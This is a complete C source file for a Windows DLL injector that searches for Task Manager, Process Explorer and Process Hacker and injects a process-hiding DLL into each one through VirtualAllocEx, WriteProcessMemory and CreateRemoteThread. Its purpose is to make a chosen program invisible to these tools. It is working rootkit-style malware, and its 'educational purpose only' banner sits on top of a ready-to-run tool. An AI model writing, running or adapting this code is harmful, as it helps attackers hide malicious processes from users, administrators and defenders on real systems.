/**
 * DLL Injector for Windows Process Hiding - Educational Purpose Only
 * 
 * This utility injects the process hiding DLL into target processes
 * like Task Manager, Process Explorer, etc.
 * BULLETPROOF VERSION with comprehensive error handling and logging
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "psapi.lib")

#define DLL_NAME L"win_process_hider.dll"
#define LOG_FILE L"C:\\injection_log.txt"

// Logging function
void WriteLog(const wchar_t* message) {
    HANDLE hFile = CreateFileW(LOG_FILE, GENERIC_WRITE, FILE_SHARE_READ, 
                              NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        SetFilePointer(hFile, 0, NULL, FILE_END);
        DWORD written;
        WriteFile(hFile, message, (DWORD)(wcslen(message) * sizeof(wchar_t)), &written, NULL);
        WriteFile(hFile, L"\r\n", 4, &written, NULL);
        CloseHandle(hFile);
    }
}

// Robust DLL injection
BOOL InjectDLL(DWORD processId, const wchar_t* dllPath) {
    HANDLE hProcess = NULL;
    LPVOID pRemoteBuf = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;
    wchar_t logMsg[512];

    swprintf(logMsg, 512, L"Attempting injection into PID %lu", processId);
    WriteLog(logMsg);

    // Open target process
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
                          PROCESS_VM_WRITE, FALSE, processId);
    if (!hProcess) {
        swprintf(logMsg, 512, L"Failed to open process %lu, error: %lu", 
                processId, GetLastError());
        WriteLog(logMsg);
        return FALSE;
    }

    // Allocate memory in target process
    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    pRemoteBuf = VirtualAllocEx(hProcess, NULL, pathSize, 
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) {
        swprintf(logMsg, 512, L"Failed to allocate memory in process %lu, error: %lu", 
                processId, GetLastError());
        WriteLog(logMsg);
        goto cleanup;
    }

    // Write DLL path to target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath, pathSize, &bytesWritten)) {
        swprintf(logMsg, 512, L"Failed to write memory in process %lu, error: %lu", 
                processId, GetLastError());
        WriteLog(logMsg);
        goto cleanup;
    }

    // Get LoadLibraryW address
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)
        GetProcAddress(hKernel32, "LoadLibraryW");
    
    if (!pLoadLibrary) {
        WriteLog(L"Failed to get LoadLibraryW address");
        goto cleanup;
    }

    // Create remote thread
    hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, 
                                pRemoteBuf, 0, NULL);
    if (!hThread) {
        swprintf(logMsg, 512, L"Failed to create remote thread in process %lu, error: %lu", 
                processId, GetLastError());
        WriteLog(logMsg);
        goto cleanup;
    }

    // Wait for injection to complete
    DWORD waitResult = WaitForSingleObject(hThread, 5000); // 5 second timeout
    if (waitResult != WAIT_OBJECT_0) {
        WriteLog(L"Remote thread did not complete in time");
        goto cleanup;
    }

    // Get thread exit code
    DWORD exitCode;
    if (GetExitCodeThread(hThread, &exitCode) && exitCode != 0) {
        swprintf(logMsg, 512, L"Successfully injected into process %lu", processId);
        WriteLog(logMsg);
        success = TRUE;
    } else {
        WriteLog(L"LoadLibraryW failed in target process");
    }

cleanup:
    if (hThread) CloseHandle(hThread);
    if (pRemoteBuf) VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}

// Get process IDs of monitoring tools
// Find and inject into monitoring tools
int InjectIntoMonitoringTools(const wchar_t* targetProcess) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    DWORD currentPID = GetCurrentProcessId();
    int injectCount = 0;
    wchar_t dllPath[MAX_PATH];
    wchar_t logMsg[512];

    // Get full DLL path
    GetCurrentDirectoryW(MAX_PATH - 20, dllPath);
    wcscat_s(dllPath, MAX_PATH, L"\\");
    wcscat_s(dllPath, MAX_PATH, DLL_NAME);

    // Check if DLL exists
    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
        wprintf(L"❌ ERROR: DLL not found: %ls\n", dllPath);
        wprintf(L"Please run build_x64.bat first.\n");
        return 0;
    }

    swprintf(logMsg, 512, L"Starting injection for target process: %ls", targetProcess);
    WriteLog(logMsg);

    // Set environment variable for DLL
    SetEnvironmentVariableW(L"TARGET_PROCESS", targetProcess);

    // Create process snapshot
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        WriteLog(L"Failed to create process snapshot");
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        WriteLog(L"Failed to get first process");
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (pe32.th32ProcessID == currentPID) continue;

        // Check for monitoring tools
        if (_wcsicmp(pe32.szExeFile, L"taskmgr.exe") == 0 ||
            _wcsicmp(pe32.szExeFile, L"procexp.exe") == 0 ||
            _wcsicmp(pe32.szExeFile, L"procexp64.exe") == 0 ||
            _wcsicmp(pe32.szExeFile, L"ProcessHacker.exe") == 0) {
            
            wprintf(L"🎯 Found monitoring tool: %ls (PID: %lu)\n", 
                   pe32.szExeFile, pe32.th32ProcessID);

            if (InjectDLL(pe32.th32ProcessID, dllPath)) {
                wprintf(L"✅ Successfully injected into %ls\n", pe32.szExeFile);
                injectCount++;
            } else {
                wprintf(L"❌ Failed to inject into %ls\n", pe32.szExeFile);
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return injectCount;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        wprintf(L"Usage: %ls <process_name_to_hide>\n", argv[0]);
        wprintf(L"Example: %ls notepad.exe\n", argv[0]);
        return 1;
    }

    wprintf(L"🛡️  Windows Process Hiding Tool (64-bit) - EDUCATIONAL PURPOSE ONLY\n");
    wprintf(L"==================================================================\n\n");
    wprintf(L"Target process to hide: %ls\n\n", argv[1]);

    WriteLog(L"=== INJECTION SESSION STARTED ===");

    int injected = InjectIntoMonitoringTools(argv[1]);

    if (injected == 0) {
        wprintf(L"⚠️  No monitoring tools found running.\n");
        wprintf(L"Please start Task Manager first, then run this tool again.\n");
        return 1;
    } else {
        wprintf(L"\n✅ Process hiding activated for: %ls\n", argv[1]);
        wprintf(L"📊 Injected into %d monitoring tool(s)\n", injected);
        wprintf(L"📝 Check log file: %ls\n", LOG_FILE);
    }

    return 0;
}
